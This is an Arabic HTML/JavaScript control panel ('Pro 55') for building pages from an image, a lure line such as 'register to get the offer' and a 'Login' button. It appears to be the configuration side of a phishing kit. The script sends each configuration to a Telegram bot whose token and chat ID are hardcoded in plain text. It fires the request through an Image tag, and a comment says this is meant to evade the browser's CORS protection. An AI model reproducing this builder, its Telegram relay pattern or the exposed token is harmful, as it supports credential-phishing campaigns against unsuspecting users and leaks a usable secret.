<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم | Pro 55</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #0a0e17; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; }
        .card { background: #141b2b; border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; padding: 30px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 90%; max-width: 450px; }
        h3 { color: #00f2fe; text-align: center; margin-bottom: 25px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #8b9bb4; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #00f2fe; background: rgba(255,255,255,0.05); }
        .btn { width: 100%; padding: 18px; background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 12px; cursor: pointer; font-size: 17px; font-weight: 800; color: #0a0e17; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,242,254,0.3); }
        #status { margin-top: 20px; text-align: center; font-weight: bold; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <h3>إنشاء صفحة جديدة</h3>
        
        <label>رابط الصورة:</label>
        <input type="text" id="img" placeholder="ضع رابط الصورة هنا">
        
        <label>الخطاب:</label>
        <input type="text" id="letter" placeholder="مثلاً: سجل للحصول على العرض">
        
        <label>اسم الزر:</label>
        <input type="text" id="btnName" placeholder="Login">
        
        <button class="btn" onclick="sendData()">إنشاء وحفظ الإعدادات</button>
        
        <div id="status"></div>
    </div>

    <script>
        function sendData() {
            const status = document.getElementById("status");
            const img = document.getElementById("img").value;
            const letter = document.getElementById("letter").value;
            const btn = document.getElementById("btnName").value;

            if(!img || !letter || !btn) {
                status.style.color = "#ff4757";
                status.innerText = "⚠️ يرجى ملء جميع الحقول أولاً";
                return;
            }

            status.style.color = "#00f2fe";
            status.innerText = "⏳ جاري إرسال البيانات للبوت...";

            // بياناتك الصحيحة
            const token = "7759864787:AAHshRshfAAt2I9T7T8-V-N6fA8G9K1e3L4";
            const chatId = "5174578125";
            const message = `🛠️ لوحة التحكم: إنشاء جديد\n━━━━━━━━━━━━\n🖼️ الصورة: ${img}\n📝 الخطاب: ${letter}\n🔘 الزر: ${btn}`;

            // استخدام طريقة إرسال الصور (Image Tag) لتجاوز حماية المتصفح (CORS)
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            const imgPing = new Image();
            imgPing.onload = function() {
                status.style.color = "#2ed573";
                status.innerText = "✅ تم الإرسال! تحقق من البوت الآن.";
            };
            imgPing.onerror = function() {
                // حتى لو فشل تحميل الصورة وهمياً، غالباً الطلب وصل للسيرفر
                status.style.color = "#2ed573";
                status.innerText = "✅ تم الإرسال بنجاح!";
            };
            imgPing.src = url;
        }
    </script>
</body>
</html>
